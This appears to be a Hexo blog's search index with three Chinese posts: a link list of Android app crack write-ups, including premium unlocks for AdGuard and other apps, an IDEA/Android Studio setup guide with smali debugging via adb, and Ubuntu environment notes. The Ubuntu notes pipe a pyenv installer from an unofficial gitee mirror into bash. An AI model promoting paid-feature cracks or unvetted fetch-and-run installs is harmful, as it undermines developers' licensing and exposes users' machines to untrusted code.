<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>对一些app的Crack分析</title>
    <url>/Crack/Some_crack_apps/</url>
    <content><![CDATA[<h1 id="对一些app的Crack分析">对一些app的Crack分析<a class="header-anchor" href="#对一些app的Crack分析"> ¶ </a></h1>
<ul>
<li><a href="https://github.com/Forgo7ten/AndroidReversePractice/blob/main/Crack/20220109-ESFileExplorer.md">20220109-ES FileExplorer修改</a></li>
<li><a href="https://github.com/Forgo7ten/AndroidReversePractice/blob/main/Crack/20220110-AdGuard.md">20220110-AdGuard高级版解锁</a></li>
<li><a href="https://github.com/Forgo7ten/AndroidReversePractice/blob/main/Crack/20220110-%E6%B8%85%E6%B5%8A.md">20220110-清浊高级功能解锁</a></li>
<li><a href="https://github.com/Forgo7ten/AndroidReversePractice/blob/main/Crack/20220114-%E7%8C%9B%E9%AC%BC%E5%AE%BF%E8%88%8D.md">20220114-猛鬼宿舍各种功能修改</a></li>
<li><a href="https://github.com/Forgo7ten/AndroidReversePractice/blob/main/Crack/20220317-168%E8%BD%BB%E6%96%AD%E9%A3%9F.md">20220317-168轻断食</a></li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>小展身手</category>
      </categories>
      <tags>
        <tag>CrackApps</tag>
      </tags>
  </entry>
  <entry>
    <title>【工具调教】IDEA初始化配置 &amp; 插件收集</title>
    <url>/Env/IDEA_initialization_configuration_and_plugins/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="IDEA初始化配置-插件收集">IDEA初始化配置 &amp; 插件收集<a class="header-anchor" href="#IDEA初始化配置-插件收集"> ¶ </a></h1>
<h2 id="安装">安装<a class="header-anchor" href="#安装"> ¶ </a></h2>
<p><a href="https://www.jetbrains.com/toolbox-app/">JetBrains Toolbox App: Manage Your Tools with Ease</a><br>
可以方便的管理升级JetBrains家 的IDE</p>
<p>配置app安装目录，实际安装目录会在<code>[install_path]/apps/[Application_name]</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210924153019244.png" alt="image-20210924153019244"></p>
<h2 id="IDEA初始化配置">IDEA初始化配置<a class="header-anchor" href="#IDEA初始化配置"> ¶ </a></h2>
<h3 id="设置utf-8编码">设置utf-8编码<a class="header-anchor" href="#设置utf-8编码"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211217151650752.png" alt="image-20211217151650752"></p>
<p><code>Help</code>-&gt;<code>Edit Custom VM Options...</code> 添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
<h3 id="Clion或Pycharm中文乱码">Clion或Pycharm中文乱码<a class="header-anchor" href="#Clion或Pycharm中文乱码"> ¶ </a></h3>
<p><a href="https://zhuanlan.zhihu.com/p/106747225">Clion 中 的乱码问题正确解决方案（来自官方技术支持） - 知乎 (zhihu.com)</a></p>
<p>按住 <code>Ctrl+Shift+Alt+/</code> （不够快捷的快捷键…）选中<code>Registry...</code>、然后取消<code>run.processes.with.pty</code></p>
<p><strong>这样会导致：缓冲区无法自动刷新</strong>，需在main函数开头添加<code>setbuf(stdout, NULL);</code></p>
<h3 id="代码不分大小写补全">代码不分大小写补全<a class="header-anchor" href="#代码不分大小写补全"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20210310144445661.png" alt="Settings -&gt; Editor -&gt; General -&gt; Code Completion"></p>
<h3 id="关闭打开项目为最后关闭项目">关闭打开项目为最后关闭项目<a class="header-anchor" href="#关闭打开项目为最后关闭项目"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20210310144544415.png" alt="在这里插入图片描述"></p>
<h3 id="设置包自动导入">设置包自动导入<a class="header-anchor" href="#设置包自动导入"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20210310144843783.png" alt="在这里插入图片描述"></p>
<h3 id="取消tab页单行显示">取消tab页单行显示<a class="header-anchor" href="#取消tab页单行显示"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210916154655950.png" alt="image-20210916154655950"></p>
<h3 id="显示空格与方法分割线">显示空格与方法分割线<a class="header-anchor" href="#显示空格与方法分割线"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20210310145114395.png" alt="在这里插入图片描述"></p>
<h3 id="设置注释随代码缩进">设置注释随代码缩进<a class="header-anchor" href="#设置注释随代码缩进"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211103122509692.png" alt="image-20211103122509692"></p>
<h3 id="IDEA-Console控制台取消行数限制">IDEA-Console控制台取消行数限制<a class="header-anchor" href="#IDEA-Console控制台取消行数限制"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220517201427041.png" alt="image-20220517201427041"></p>
<p>或者在.properties中添加：<code>idea.cycle.buffer.size=disabled</code>（未测试）</p>
<h3 id="修改Maven仓库地址，管理环境变量">修改Maven仓库地址，管理环境变量<a class="header-anchor" href="#修改Maven仓库地址，管理环境变量"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220102141559618.png" alt="image-20220102141559618"></p>
<h3 id="注释模板">注释模板<a class="header-anchor" href="#注释模板"> ¶ </a></h3>
<h4 id="设置文件头模板">设置文件头模板<a class="header-anchor" href="#设置文件头模板"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20210310145156164.png" alt="在这里插入图片描述"><br>
添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">if</span> ($&#123;PACKAGE_NAME&#125; &amp;&amp; $&#123;PACKAGE_NAME&#125; != <span class="string">&quot;&quot;</span>)<span class="keyword">package</span> $&#123;PACKAGE_NAME&#125;;#end</span><br><span class="line">#parse(<span class="string">&quot;File Header.java&quot;</span>)</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span> $&#123;NAME&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> //TODO</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> $&#123;USER&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> $&#123;DATE&#125;</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> $</span>&#123;NAME&#125; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="添加方法注释模板">添加方法注释模板<a class="header-anchor" href="#添加方法注释模板"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211027100253830.png" alt="image-20211027100253830"></p>
<p>右侧＋号，添加<code>Template group</code>，设置为<code>UserDefine</code></p>
<p>之后添加<code>Live Template</code>。<code>Abbreviation</code>设置的关键字，<code>Description</code>设置描述，<code>Expand with</code>使用<code>Tab</code>补全。需要点击<code>Define</code>选择生效范围，选择<code>Java</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Method</span> $method$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> $desc$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $params$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> $return$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> $user$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> $date$</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>之后点击<code>Edit variables</code>按钮<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211027102246336.png" alt="image-20211027102246336"></p>
<p>添加好后只有在方法体内部输入该快捷键，才能自动获取到方法名等</p>
<h4 id="添加字段注释模板">添加字段注释模板<a class="header-anchor" href="#添加字段注释模板"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211027102736665.png" alt="image-20211027102736665"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Field</span> $field$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> $desc$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> $user$</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> $date$</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211027102818641.png" alt="image-20211027102818641"></p>
<h3 id="取消包折叠">取消包折叠<a class="header-anchor" href="#取消包折叠"> ¶ </a></h3>
<p>将<code>Flatten Packages</code>与<code>Compact Middle Packages</code>取消勾选</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211011213545934.png" alt="image-20211011213545934"></p>
<h3 id="优化版本控制显示">优化版本控制显示<a class="header-anchor" href="#优化版本控制显示"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210916154936801.png" alt="image-20210916154936801"></p>
<h2 id="AndroidStudio配置">AndroidStudio配置<a class="header-anchor" href="#AndroidStudio配置"> ¶ </a></h2>
<h3 id="安装前设置AndroidStudio缓存位置">安装前设置AndroidStudio缓存位置<a class="header-anchor" href="#安装前设置AndroidStudio缓存位置"> ¶ </a></h3>
<p>默认位置为<code>user/.android</code></p>
<p>配置环境变量：<code>ANDROID_SDK_HOME</code>：<code>F:\CodeData\Android</code></p>
<h3 id="修改SDK默认位置">修改SDK默认位置<a class="header-anchor" href="#修改SDK默认位置"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210819122944325.png" alt="image-20210819122944325"></p>
<h3 id="修改gradle位置">修改gradle位置<a class="header-anchor" href="#修改gradle位置"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210819123117536.png" alt="image-20210819123117536"></p>
<p>（仅仅是修改当前项目）</p>
<p>Windows配置环境变量：名为<code>GRADLE_USER_HOME</code>值为自定义的路径（应该可用）</p>
<h3 id="开启构建GradleTask">开启构建GradleTask<a class="header-anchor" href="#开启构建GradleTask"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211102093126825.png" alt="image-20211102093126825"></p>
<p>会出现相应Task</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211102093236278.png" alt="image-20211102093236278"></p>
<h3 id="jdk版本配置存在位置">jdk版本配置存在位置<a class="header-anchor" href="#jdk版本配置存在位置"> ¶ </a></h3>
<p>首次设置完后，jdk版本不能删除不能修改默认；通过修改xml配置文件的方式来修改</p>
<p>AndroidStudio：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%APPDATA%\Google\AndroidStudio2020.3\options\jdk.table.xml</span><br></pre></td></tr></table></figure>
<p>IDEA</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%APPDATA%\JetBrains\IntelliJIdea2021.3\options\jdk.table.xml</span><br></pre></td></tr></table></figure>
<p>打开后<code>&lt;component name=&quot;ProjectJdkTable&quot;&gt;</code>下的每个<code>&lt;jdk version=&quot;2&quot;&gt;</code>节点都是显示的一个版本</p>
<p><strong>IDEA可以直接从【Project Structure】-&gt;【Platform Settings】-&gt; 【SDKs】中修改</strong></p>
<p>其余的JetBrains家的，配置文件都在<code>%APPDATA%\JetBrains\[APPNAME]\options\</code></p>
<h2 id="IDEA插件">IDEA插件<a class="header-anchor" href="#IDEA插件"> ¶ </a></h2>
<p>常用</p>
<table>
<thead>
<tr>
<th style="text-align:center">插件名字</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IdeaVim</td>
<td style="text-align:center">vim插件</td>
</tr>
<tr>
<td style="text-align:center">Codota</td>
<td style="text-align:center">代码智能提示</td>
</tr>
<tr>
<td style="text-align:center">Alibaba Java Code Guidelines</td>
<td style="text-align:center">阿里巴巴 Java 代码规范</td>
</tr>
<tr>
<td style="text-align:center">Translation</td>
<td style="text-align:center">必备的翻译插件</td>
</tr>
<tr>
<td style="text-align:center">Rainbow Brackets</td>
<td style="text-align:center">括号变成不一样的颜色</td>
</tr>
<tr>
<td style="text-align:center">HighlightBracketPair</td>
<td style="text-align:center">括号开始结尾 高亮显示</td>
</tr>
<tr>
<td style="text-align:center">Grep Console</td>
<td style="text-align:center">控制台日志 高亮</td>
</tr>
<tr>
<td style="text-align:center">google-java-format</td>
<td style="text-align:center">代码自动格式化</td>
</tr>
<tr>
<td style="text-align:center">Key promoter X</td>
<td style="text-align:center">告知操作的快捷键</td>
</tr>
<tr>
<td style="text-align:center">CodeGlance</td>
<td style="text-align:center">滚动条变缩略图</td>
</tr>
<tr>
<td style="text-align:center">One Dark Theme</td>
<td style="text-align:center">超级好看主题</td>
</tr>
</tbody>
</table>
<p>装饰</p>
<table>
<thead>
<tr>
<th style="text-align:center">插件名字</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Material Theme UI</td>
<td style="text-align:center">IDEA主题插件</td>
</tr>
<tr>
<td style="text-align:center">Background Image Plus +</td>
<td style="text-align:center">更换IDEA背景</td>
</tr>
<tr>
<td style="text-align:center">Power Mode II</td>
<td style="text-align:center">打字效果</td>
</tr>
</tbody>
</table>
<p>其他</p>
<table>
<thead>
<tr>
<th style="text-align:center">插件名字</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Presentation Assistant</td>
<td style="text-align:center">快捷键展示（使用的快捷键弹窗展示到桌面底部）</td>
</tr>
<tr>
<td style="text-align:center">RoboPOJOGenerator—JSON</td>
<td style="text-align:center">JSONObject格式解析成实体类</td>
</tr>
<tr>
<td style="text-align:center">CamelCase</td>
<td style="text-align:center">多种命名格式之间切换</td>
</tr>
<tr>
<td style="text-align:center">jclasslib bytecode viewer</td>
<td style="text-align:center">查看字节码</td>
</tr>
<tr>
<td style="text-align:center">GenerateO2O</td>
<td style="text-align:center">自动填充参数的值</td>
</tr>
<tr>
<td style="text-align:center">GenerateAllSetter</td>
<td style="text-align:center">自动调用所有 Setter 函数</td>
</tr>
<tr>
<td style="text-align:center">Maven Helper</td>
<td style="text-align:center">方便maven项目解决jar冲突</td>
</tr>
<tr>
<td style="text-align:center">FindBugs</td>
<td style="text-align:center">检查代码中的隐患</td>
</tr>
<tr>
<td style="text-align:center">Stack trace to UML</td>
<td style="text-align:center">根据 JVM 异常堆栈画 UML时序图和通信图</td>
</tr>
<tr>
<td style="text-align:center">Java Stream Debugger</td>
<td style="text-align:center">Stream 将操作步骤可视化</td>
</tr>
<tr>
<td style="text-align:center">RestfulToolkit</td>
<td style="text-align:center">快捷跳转Action方法</td>
</tr>
<tr>
<td style="text-align:center">Jrebel for Intellij</td>
<td style="text-align:center">Java代码修改后立即生效</td>
</tr>
<tr>
<td style="text-align:center">String Manipulation</td>
<td style="text-align:center">对字符串的处理</td>
</tr>
<tr>
<td style="text-align:center">IDEA QAPlug</td>
<td style="text-align:center">帮助我们提前找到潜在的问题bug</td>
</tr>
<tr>
<td style="text-align:center">Lombok</td>
<td style="text-align:center">自动生成getter/setter/toString方法</td>
</tr>
<tr>
<td style="text-align:center">SonarLint</td>
<td style="text-align:center">代码质量检查插件</td>
</tr>
<tr>
<td style="text-align:center">Save Actions</td>
<td style="text-align:center">格式化代码插件</td>
</tr>
<tr>
<td style="text-align:center">Grep Console</td>
<td style="text-align:center">自定义控制台输出格式</td>
</tr>
<tr>
<td style="text-align:center">MetricsReloaded</td>
<td style="text-align:center">代码复杂度检查插件</td>
</tr>
<tr>
<td style="text-align:center">Statistic</td>
<td style="text-align:center">代码统计插件</td>
</tr>
</tbody>
</table>
<h2 id="AndroidStudio插件">AndroidStudio插件<a class="header-anchor" href="#AndroidStudio插件"> ¶ </a></h2>
<p>装饰</p>
<table>
<thead>
<tr>
<th style="text-align:center">插件名字</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="https://github.com/alibaba/freeline">Freeline</a></td>
<td style="text-align:center">Android秒级编译</td>
</tr>
<tr>
<td style="text-align:center">ADB Idea</td>
<td style="text-align:center">ADB指令快捷操作</td>
</tr>
<tr>
<td style="text-align:center"><a href="https://github.com/JesusFreke/smalidea">Smalidea</a></td>
<td style="text-align:center">Smalidea断点调试等</td>
</tr>
</tbody>
</table>
<h3 id="插件配置">插件配置<a class="header-anchor" href="#插件配置"> ¶ </a></h3>
<h4 id="Smalidea使用">Smalidea使用<a class="header-anchor" href="#Smalidea使用"> ¶ </a></h4>
<p>(0.6版本已可以自动配置)检查<code>Settings</code>-&gt;<code>Editor</code>-&gt;<code>File Types</code>中，除了<code>Smali</code>外多了一个<code>smali Files</code>，内有内容<code>*.smali</code></p>
<p>菜单栏<code>File</code>下多了<code>Profile or Debug Apk</code>；可以方便的选择一个apk来反编译成项目、或者自己反编译然后导入也成</p>
<p>拥有项目后，进行调试</p>
<p>准备app为调试状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n [PackageName]/[入口Activity全名]</span><br><span class="line">adb shell ps | findstr [PackageName]</span><br><span class="line">adb forward tcp:8700 jdwp:[PID]</span><br></pre></td></tr></table></figure>
<p>下好smali断点</p>
<p>选择附加进程调试<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220107012320575.png" alt="image-20220107012320575"></p>
<p>开始调试</p>
]]></content>
      <categories>
        <category>工具&amp;环境调教</category>
      </categories>
      <tags>
        <tag>工具&amp;环境调教</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux环境搭建、配置记录(不定时更新)</title>
    <url>/Env/Linux_environment_configuration_record/</url>
    <content><![CDATA[<h1 id="ubuntu虚拟机安装">ubuntu虚拟机安装<a class="header-anchor" href="#ubuntu虚拟机安装"> ¶ </a></h1>
<h1 id="Init">Init<a class="header-anchor" href="#Init"> ¶ </a></h1>
<h2 id="安装Ubuntu时候语言选择默认英文">安装Ubuntu时候语言选择默认英文<a class="header-anchor" href="#安装Ubuntu时候语言选择默认英文"> ¶ </a></h2>
<h2 id="1-先更新源">1. 先更新源<a class="header-anchor" href="#1-先更新源"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<h2 id="2-安装VMwareTools">2. 安装VMwareTools<a class="header-anchor" href="#2-安装VMwareTools"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
<h2 id="3-Ubuntu换源">3. Ubuntu换源<a class="header-anchor" href="#3-Ubuntu换源"> ¶ </a></h2>
<p>Ubuntu系统中，软件源文件地址为：<code>/etc/apt/sources.list</code></p>
<p>1.备份原来的源，将以前的源备份一下，以防以后可以用的。</p>
<p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p>
<p>2.打开<code>/etc/apt/sources.list</code>文件，在前面添加如下条目，并保存。</p>
<p><code>sudo vim /etc/apt/sources.list</code>（可将vim更换为自己熟悉的编辑器）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<h2 id="4-更新系统软件">4. 更新系统软件<a class="header-anchor" href="#4-更新系统软件"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
<h2 id="5-将Ubuntu系统语言更换为简体中文">5. 将Ubuntu系统语言更换为简体中文<a class="header-anchor" href="#5-将Ubuntu系统语言更换为简体中文"> ¶ </a></h2>
<p><a href="https://blog.csdn.net/qq_19339041/article/details/80058575">ubuntu 16.04 更改系统语言为简体中文</a><br>
System Settings→Language Support<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20200204181353420.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//2020020418140546.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20200204181422742.png" alt="在这里插入图片描述"><br>
重启后会改变<br>
<strong>标准文件夹不要更新名称！！！</strong><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//20200204181627107.png" alt="在这里插入图片描述"></p>
<h2 id="6-安装谷歌输入法">6. 安装谷歌输入法<a class="header-anchor" href="#6-安装谷歌输入法"> ¶ </a></h2>
<ol>
<li>
<p>安装谷歌拼音</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>打开软件<code>language support(语言支持)</code>，切换<code>Keyboard input method system(键盘输入法系统)</code>为<code>fcitx</code>，然后重启</p>
</li>
<li>
<p>重启后在右上角状态栏点击键盘图标，在下拉单里选择倒数第三个<code>Configure(配置)</code>进入配置界面。</p>
</li>
<li>
<p>左下角点<code>+</code>号，取消<code>Only Show Current Language(只选择当前语言)</code>勾选，搜索<code>Google</code>，选择<code>Google 拼音</code>并点击OK</p>
</li>
<li>
<p>切换输入法快捷键：<code>ctrl space</code></p>
</li>
</ol>
<h2 id="7-卸载自带软件">7. 卸载自带软件<a class="header-anchor" href="#7-卸载自带软件"> ¶ </a></h2>
<p><a href="https://www.htcp.net/2568.html">https://www.htcp.net/2568.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt purge gnome-mahjongg aisleriot gnome-mines gnome-sudoku</span><br><span class="line">sudo apt purge libreoffice-common thunderbird</span><br><span class="line">sudo apt purge rhythmbox simple-scan transmission-common</span><br></pre></td></tr></table></figure>
<h2 id="8-安装软件列表">8. 安装软件列表<a class="header-anchor" href="#8-安装软件列表"> ¶ </a></h2>
<h3 id="为64位系统提供32位运行环境支撑">为64位系统提供32位运行环境支撑<a class="header-anchor" href="#为64位系统提供32位运行环境支撑"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install lib32z1</span><br><span class="line">sudo apt-get -y install libc6-i386</span><br><span class="line">sudo apt-get -y install libc6-dev</span><br><span class="line">sudo apt-get install lib32stdc++6</span><br><span class="line">sudo apt-get install libstdc++6</span><br></pre></td></tr></table></figure>
<h3 id="安装pyenv">安装pyenv<a class="header-anchor" href="#安装pyenv"> ¶ </a></h3>
<p><a href="https://github.com/pyenv/pyenv">https://github.com/pyenv/pyenv</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev \</span><br><span class="line">libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \</span><br><span class="line">libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</span><br><span class="line"></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">curl -L https://gitee.com/ibopo//pyenv-installer/raw/master/bin/pyenv-installer | bash</span><br><span class="line"><span class="built_in">cd</span> ~/.pyenv &amp;&amp; src/configure &amp;&amp; make -C src</span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class="line"><span class="built_in">cd</span> ~/.pyenv &amp;&amp; src/configure &amp;&amp; make -C src</span><br><span class="line"><span class="comment">################################</span></span><br></pre></td></tr></table></figure>
<p>.bashrc添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">###############官网更新 新###################</span></span><br><span class="line">sed -Ei -e <span class="string">&#x27;/^([^#]|$)/ &#123;a \</span></span><br><span class="line"><span class="string">export PYENV_ROOT=&quot;$HOME/.pyenv&quot;</span></span><br><span class="line"><span class="string">a \</span></span><br><span class="line"><span class="string">export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;</span></span><br><span class="line"><span class="string">a \</span></span><br><span class="line"><span class="string">&#x27;</span> -e <span class="string">&#x27;:a&#x27;</span> -e <span class="string">&#x27;$!&#123;n;ba&#125;;&#125;&#x27;</span> ~/.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init --path)&quot;&#x27;</span> &gt;&gt;~/.profile</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init -)&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment">##################.bashrc添加(实践了这种)#####################</span></span><br><span class="line"><span class="comment"># pyenv start</span></span><br><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/shims:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">command</span> -v pyenv 1&gt;/dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv init -)</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv virtualenv-init -)</span>&quot;</span></span><br><span class="line"><span class="comment"># pyenv end</span></span><br></pre></td></tr></table></figure>
<p>pyenv离线安装python：将下载的python包放在<code>~/.pyenv/cache </code>目录下</p>
<h3 id="安装node-js">安装node.js<a class="header-anchor" href="#安装node-js"> ¶ </a></h3>
